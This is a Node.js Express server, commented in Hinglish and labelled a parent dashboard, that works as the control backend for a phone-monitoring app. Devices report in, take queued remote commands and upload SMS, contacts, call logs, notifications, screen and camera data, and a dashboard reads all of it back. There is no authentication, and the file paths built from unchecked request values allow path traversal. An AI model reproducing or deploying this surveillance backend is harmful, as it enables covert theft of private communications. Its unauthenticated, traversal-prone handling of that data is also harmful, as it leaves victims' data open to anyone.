const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Saare online devices ka data yahan rahega
let devicesStatus = {}; 

// ==================================================
// 📲 PHONE APP API (Yahan se App connect hoga)
// ==================================================

app.post('/api/status', (req, res) => {
    let { device_id, model, battery, version, charging } = req.body;
    if (!device_id) return res.status(400).json({ error: "Missing ID" });

    // ID ko hamesha Trim aur UpperCase karo taaki mismatch na ho
    const id = device_id.toString().trim().toUpperCase();

    // Pehle se pending command nikaalo
    const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

    // Device status memory mein update karo (Dashboard ke liye)
    devicesStatus[id] = {
        id: id,
        model: model || "Unknown",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lastSeen: Date.now(),
        command: "none" // Command dene ke baad reset
    };

    console.log(`📡 [PING] ID: ${id} | Model: ${model} | Bat: ${battery}% | Cmd Sent: ${pendingCommand}`);
    
    // Phone ko response mein command bhejdo
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        
        // Agar SMS, Contacts ya Call Logs hain toh list ko manage karo
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
        
        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) { existingData = []; }
            }
            if (!Array.isArray(existingData)) existingData = [];

            // Naya data list ke shuruat mein jodo
            const finalData = Array.isArray(parsedData) ? [...parsedData, ...existingData] : [parsedData, ...existingData];
            fs.writeFileSync(filePath, JSON.stringify(finalData.slice(0, 1000), null, 2));
        } else {
            // Screen, Camera etc ke liye direct save
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        console.log(`📥 [DATA RECEIVED] ${type} from ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error("Save Error:", error.message);
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
// 💻 PARENT DASHBOARD API (Admin Panel ke liye)
// ==================================================

// Dashboard par Status dikhane ke liye
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];

    if (!device) {
        return res.json({ id: id, isOnline: false, model: "Not Registered" });
    }

    // Agar last ping 60 seconds ke andar hai toh Online
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

// Dashboard se command bhejne ke liye
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id) return res.status(400).json({ error: "ID required" });

    const id = device_id.toUpperCase().trim();
    
    if (!devicesStatus[id]) devicesStatus[id] = { id: id };
    
    devicesStatus[id].command = command;
    console.log(`🚀 [COMMAND QUEUED] ${command} for Device: ${id}`);
    res.json({ status: "success" });
});

// JSON data fetch karne ke liye (Contacts, SMS etc)
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const id = req.params.device_id.toUpperCase().trim();
    const filePath = path.join(UPLOADS_DIR, `${id}_${req.params.type}.json`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

app.listen(PORT, () => {
    console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`);
    console.log(`📂 DATA WILL BE SAVED IN: ${UPLOADS_DIR}`);
});
